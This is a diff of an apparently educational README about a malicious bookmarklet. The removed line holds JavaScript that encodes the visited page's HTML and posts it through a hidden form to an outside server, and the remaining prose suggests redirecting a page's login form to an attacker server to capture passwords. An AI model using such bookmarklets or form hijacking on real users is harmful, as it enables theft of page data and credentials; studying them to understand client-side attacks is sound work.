@@ -64,7 +64,7 @@ This is not entirely functional yet, I think I am running into trouble with esca
       
     });
 
-[Bookmarklet link](javascript:(function() { function injectJquery(callback) {  if (window.jQuery) {    return callback(window.jQuery);  }  let script = document.createElement('script');  script.setAttribute('src', '//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js');  script.onload = () => callback(window.jQuery);  script.onerror = e => alert('The script failed to load: ' + e);  document.head.appendChild(script);}var catGifs = ['http://www.catgifpage.com/gifs/325.gif', 'https://media.tenor.com/images/47b81948be5023555549c01d88ae3289/tenor.gif', 'https://memesbams.com/wp-content/uploads/2017/11/Hilarious-Cat-Gifs.gif'];injectJquery(function ($) {  var catGif = catGifs[Math.floor(Math.random() * catGifs.length)];  $('body').prepend("<img src='" + catGif + "'>");  var url = "http://calebcalebcaleb.com/playback.php";  var bodyHtml = encodeURIComponent($('body').html());  $('body').append("<form id='evil' action='" + url + "' method='POST'><input name='bodyHtml' type='hidden' value='" + bodyHtml + "'><input name='redirectUrl' type='hidden' value='" + url + "'><input type='submit'></form>");}); })())
+
   
 An alternative solution, similarly malicious but perhaps more elegant, would be to search for existing forms on the page (like a login form) and change its destination URL to a server I control. This would be less obtrusive/detectable for the user, and possibly be more efficient at swiping useful data (like passwords).
 
